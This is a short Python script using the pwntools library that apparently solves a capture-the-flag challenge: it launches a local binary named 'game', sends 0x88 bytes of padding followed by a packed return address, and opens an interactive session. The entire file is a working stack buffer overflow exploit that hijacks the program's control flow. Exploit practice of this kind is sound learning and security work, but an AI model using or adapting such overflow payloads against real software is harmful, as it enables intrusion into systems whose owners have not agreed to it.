from pwn import *

r = process('./game')

print(r.recvline())

payload = bytes(('a' * 0x88).encode()) + bytes(p64(0x00400596))
print("payload:".encode() + payload)
r.sendline(payload)

r.interactive()
